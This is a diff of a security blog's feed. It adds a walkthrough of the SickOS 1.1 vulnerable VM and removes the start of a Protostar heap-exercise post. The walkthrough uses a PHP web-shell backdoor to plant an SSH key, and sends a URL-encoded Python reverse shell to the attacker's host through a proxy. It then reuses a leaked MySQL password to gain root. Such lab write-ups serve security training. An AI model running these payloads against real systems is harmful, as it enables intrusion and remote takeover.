+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>
+
+<p>To encode spaces:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ cat blabla.pub  | sed &rsquo;s#+#%2b#g'
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>
+
+<p>To store public key:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+&lt;/a>&lsquo;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX&rsquo;>~www-data/.ssh/authorized_keys&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We verify successful upload:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX</span></code></pre></td></tr></table></div></figure></p>
+
+<p>It does not work, the server is still asking password, even when we try to set more restricted permission:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
+</span><span class='line'>&lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x77;&#119;&#119;&#x2d;&#x64;&#97;&#x74;&#97;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#56;&#48;&#x2e;&#49;&#54;&#57;">&#x77;&#x77;&#x77;&#45;&#x64;&#97;&#x74;&#x61;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#56;&#48;&#x2e;&#x31;&#x36;&#57;&lt;/a>&rsquo;s password:&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
+</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh&lt;/a>&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We come back to this later. Trying different payload, we encode the following
+command and invoke via our backdoor, the second output is ascii encoded using
+Burp Encoder:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1400</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</span></code></pre></td></tr></table></div></figure></p>
+
+<p>This is how we got the remote shell:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1400&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30">http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30&lt;/a>&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
+</span><span class='line'>mysql -uroot -pjohn@123 mysql
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 165
+</span><span class='line'>Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Copyright &copy; 2000, 2015, Oracle and/or its affiliates. All rights reserved.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql> SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>| User             | Host      | Password                                  |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>| root             | localhost | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | sickos    | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | 127.0.0.1 | &lt;em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | ::1       | &lt;/em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>5 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>His shell uses the same password and we can easily escalate to uid 0.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/var/www/wolfcms/public$ su sickos
+</span><span class='line'>su sickos
+</span><span class='line'>Password: john@123&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>[sudo] password for sickos: john@123&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Matching Defaults entries for sickos on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>User sickos may run the following commands on this host:
+</span><span class='line'>    (ALL : ALL) ALL
+</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo su
+</span><span class='line'>sudo su&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@SickOs:/var/www/wolfcms/public# cd /root
+</span><span class='line'>cd /root
+</span><span class='line'>root@SickOs:~# ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 40
+</span><span class='line'>drwx&mdash;&mdash;  3 root root 4096 Dec  6 21:14 .
+</span><span class='line'>drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root 3724 Dec  6 21:18 .bash_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root 3106 Apr 19  2012 .bashrc
+</span><span class='line'>drwx&mdash;&mdash;  2 root root 4096 Sep 22 08:33 .cache
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root   22 Dec  5 06:24 .mysql_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  140 Apr 19  2012 .profile
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root 5230 Dec  6 21:14 .viminfo
+</span><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>If you are viewing this!!&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>ROOT!&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>You have Succesfully completed SickOS1.1.
+</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Unfortunately our user could not change this permission.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kioptrix: Level 4]]></title>
@@ -443,7 +1115,7 @@ bash could be directly executed too. Finally, we set the suid privileges for
 </span><span class='line'>exit&lt;/p>
 </span><span class='line'>
 </span><span class='line'>&lt;p>root@kali32:~# ssh -l john 192.168.80.154
-</span><span class='line'>&lt;a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#111;&#104;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x38;&#x30;&#46;&#x31;&#x35;&#52;">&#106;&#x6f;&#104;&#x6e;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x38;&#48;&#46;&#49;&#x35;&#x34;&lt;/a>&rsquo;s password:
+</span><span class='line'>&lt;a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#106;&#111;&#104;&#x6e;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x38;&#x30;&#x2e;&#49;&#53;&#x34;">&#106;&#x6f;&#104;&#110;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x38;&#x30;&#x2e;&#x31;&#x35;&#x34;&lt;/a>&rsquo;s password:
 </span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
 </span><span class='line'>== Welcome LigGoat Employee ==
 </span><span class='line'>LigGoat Shell is in place so you  don&rsquo;t screw up
@@ -879,7 +1551,7 @@ method:</p>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>Username: test_user
-</span><span class='line'>Email: &lt;a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x74;&#101;&#x73;&#116;&#64;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x63;&#111;&#109;">&#x74;&#101;&#x73;&#x74;&#64;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#x6d;&lt;/a>
+</span><span class='line'>Email: &lt;a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#116;&#x65;&#x73;&#116;&#64;&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#99;&#111;&#x6d;">&#116;&#101;&#115;&#x74;&#64;&#x65;&#120;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#x6d;&lt;/a>
 </span><span class='line'>Password: 6ZaxN2Vzm9NUJT2y</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We log in and proceed to the text step:
@@ -4167,1482 +4839,6 @@ output, instead of socket.</p>
 </span><span class='line'> 804975b:       89 e5                   mov    ebp,esp
 </span><span class='line'> 804975d:       5d                      pop    ebp
 </span><span class='line'> 804975e:       c3                      ret  &lt;br/></span></code></pre></td></tr></table></div></figure></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Heap Levels)]]></title>
-    <link href="http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels/"/>
-    <updated>2015-07-04T09:29:50+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/07/04/exploit-exercises-protostar-heap-levels</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget &lt;a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt&lt;/a> &ndash;no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure></p>
-
-<h2>Protostar Heap0</h2>
-
-<p><figure class='code'><figcaption><span>heap0.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
-</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">level</span> <span class="n">passed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">nowinner</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">level</span> <span class="n">has</span> <span class="n">not</span> <span class="n">been</span> <span class="n">passed</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="k">struct</span> <span class="n">data</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">d</span><span class="p">;</span>
